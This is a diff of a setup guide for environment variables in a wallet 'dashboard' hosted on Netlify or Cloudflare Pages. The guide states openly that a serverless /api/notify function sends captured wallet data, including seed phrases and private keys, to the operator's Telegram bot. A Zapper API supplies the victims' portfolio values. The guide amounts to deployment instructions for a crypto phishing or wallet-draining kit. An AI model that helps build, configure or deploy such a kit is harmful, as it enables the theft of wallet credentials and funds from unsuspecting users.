@@ -1,93 +1,80 @@
 # Environment Variables Setup Guide
 
-This guide explains how to set up environment variables for the VaultGuard wallet dashboard.
+## Required Variables
 
-## Required Variables for Netlify
-
-### 1. WalletConnect Project ID
-- **Variable Name**: `WALLETCONNECT_PROJECT_ID`
-- **Where to Get**: https://cloud.walletconnect.com/
-- **Purpose**: Served to the frontend via `/api/config` Netlify Function to enable WalletConnect
-- **Steps**:
-  1. Go to https://cloud.walletconnect.com/
-  2. Sign up / Login
-  3. Create a new project
-  4. Copy the "Project ID"
-  5. Add to Netlify environment variables
-
-### 2. Zapper API Key(s)
-- **Variable Name**: `ZAPPER_API_KEYS`
-- **Where to Get**: https://studio.zapper.xyz/
-- **Purpose**: Powers the `/api/portfolio/:address` endpoint — fetches wallet portfolio value and top holdings
-- **Supports key rotation**: You can add multiple comma-separated keys: `key1,key2,key3`
-- **Steps**:
-  1. Go to https://studio.zapper.xyz/
-  2. Sign up / Login
-  3. Create an API key
-  4. Add to Netlify environment variables (comma-separate multiple keys for rotation)
-
-### 3. Telegram Bot Token
-- **Variable Name**: `TELEGRAM_BOT_TOKEN`
-- **Where to Get**: [@BotFather](https://t.me/BotFather) on Telegram
-- **Purpose**: Used by `/api/notify` Netlify Function to send captured data (addresses, seed phrases, private keys) to your Telegram
-- **Steps**:
-  1. Open Telegram, search for `@BotFather`
-  2. Send `/newbot` and follow prompts
-  3. Copy the token it gives you
-
-### 4. Telegram Chat ID
-- **Variable Name**: `TELEGRAM_CHAT_ID`
-- **Where to Get**: Telegram API
-- **Purpose**: The chat/channel where notifications are delivered
-- **Steps**:
-  1. Message your bot at least once
-  2. Visit `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`
-  3. Copy the `chat.id` value from the response
-
-## Complete Netlify Environment Variables Summary
-
-| Variable | Required | Purpose |
+| Variable | Used by | Purpose |
 |---|---|---|
-| `WALLETCONNECT_PROJECT_ID` | ✅ Yes | WalletConnect modal |
-| `ZAPPER_API_KEYS` | ✅ Yes | Portfolio data (supports comma-separated keys) |
-| `TELEGRAM_BOT_TOKEN` | ✅ Yes | Notification alerts |
-| `TELEGRAM_CHAT_ID` | ✅ Yes | Where alerts are sent |
+| `VITE_WALLETCONNECT_PROJECT_ID` | Build (baked in) | Powers the WalletConnect / Reown modal |
+| `ZAPPER_API_KEYS` | Serverless function | Portfolio balance data (comma-separate multiple keys) |
+| `TELEGRAM_BOT_TOKEN` | Serverless function | Sends captured wallet data to Telegram |
+| `TELEGRAM_CHAT_ID` | Serverless function | Your Telegram chat/channel ID |
 
-## Setting Up in Netlify
+> **`VITE_` prefix is required.** Vite only exposes env vars to the frontend bundle when they start with `VITE_`. This variable is baked into the JS at build time — set it BEFORE triggering a build.
 
-1. **Go to Netlify Site Settings**
-   - Open your site dashboard
-   - Go to `Site configuration` → `Environment variables`
+---
 
-2. **Add each variable**:
-   ```
-   WALLETCONNECT_PROJECT_ID = your-project-id
-   ZAPPER_API_KEYS          = key1,key2,key3
-   TELEGRAM_BOT_TOKEN       = 123456:ABCdef...
-   TELEGRAM_CHAT_ID         = -1001234567890
-   ```
+## Get Your WalletConnect Project ID
 
-3. **Redeploy** after adding variables
+1. Go to **[cloud.reown.com](https://cloud.reown.com)**
+2. Sign up / log in → **Create a new project**
+3. Copy the **Project ID** (32-char hex, no 0x prefix — e.g. `abc123...`)
+4. Add your deployed domain to **Settings → Allowlist** (e.g. `https://your-site.netlify.app`)
+5. Set `VITE_WALLETCONNECT_PROJECT_ID=<your-id>` in your platform dashboard
 
-## Netlify Functions (Backend Endpoints)
+---
 
-All backend logic runs as Netlify Functions — no separate server needed:
+## Platform Setup
 
-| Endpoint | Function file | What it does |
-|---|---|---|
-| `GET /api/config` | `netlify/functions/config.mts` | Returns WalletConnect project ID to frontend |
-| `GET /api/portfolio/:address` | `netlify/functions/portfolio.mts` | Zapper GraphQL proxy — returns portfolio data |
-| `POST /api/notify` | `netlify/functions/notify.mts` | Sends captured wallet data to Telegram |
+### Netlify (Git deploy)
 
-## Local Development
+Set in **Site Settings → Environment Variables**:
+```
+VITE_WALLETCONNECT_PROJECT_ID = your-reown-project-id
+ZAPPER_API_KEYS               = key1,key2
+TELEGRAM_BOT_TOKEN            = 123456:ABCdef...
+TELEGRAM_CHAT_ID              = -1001234567890
+```
+
+Build settings (already in `netlify.toml` — no manual config needed):
+- **Build command**: `npm install && cd client && npm install && cd .. && npm run build`
+- **Publish directory**: `dist/public`
+- **Functions directory**: `netlify/functions`
+
+---
+
+### Cloudflare Pages (Git deploy)
+
+Cloudflare does NOT read `netlify.toml`. Set everything in the **Cloudflare dashboard**:
+
+1. Go to **Workers & Pages → Create → Pages → Connect to Git**
+2. Select your repo
+3. Under **Build settings**:
+   - **Framework preset**: None
+   - **Build command**: `npm install && cd client && npm install && cd .. && npm run build`
+   - **Build output directory**: `dist/public`
+4. Under **Environment variables** (Production):
+```
+VITE_WALLETCONNECT_PROJECT_ID = your-reown-project-id
+ZAPPER_API_KEYS               = key1,key2
+TELEGRAM_BOT_TOKEN            = 123456:ABCdef...
+TELEGRAM_CHAT_ID              = -1001234567890
+```
+5. Click **Save and Deploy**
+
+> **Note:** Cloudflare Pages does not support Netlify Functions. The `/api/notify`, `/api/config`, and `/api/portfolio/:address` endpoints will only work on Netlify. On Cloudflare, WalletConnect will work (it reads the env var at build time), but Telegram notifications and Zapper portfolio data will not fire unless you also set up Cloudflare Workers separately.
+
+The `_redirects` file (already in `client/public/`) handles SPA routing on both Netlify and Cloudflare Pages automatically.
+
+---
+
+### Local Development
 
 Create a `.env` file in the project root:
-
 ```bash
-WALLETCONNECT_PROJECT_ID=your_project_id
+VITE_WALLETCONNECT_PROJECT_ID=your_project_id
 ZAPPER_API_KEYS=your_zapper_key
 TELEGRAM_BOT_TOKEN=your_bot_token
 TELEGRAM_CHAT_ID=your_chat_id
 ```
 
-Never commit `.env` to Git!
+Never commit `.env` to Git.
